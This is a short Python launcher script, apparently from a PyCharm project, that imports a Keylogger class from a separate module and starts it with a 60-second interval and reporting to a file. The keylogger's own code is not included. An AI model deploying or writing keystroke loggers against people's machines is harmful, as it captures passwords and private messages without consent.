from keylogger import Keylogger

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    keylogger = Keylogger(interval=60, report_method="file")
    keylogger.start()
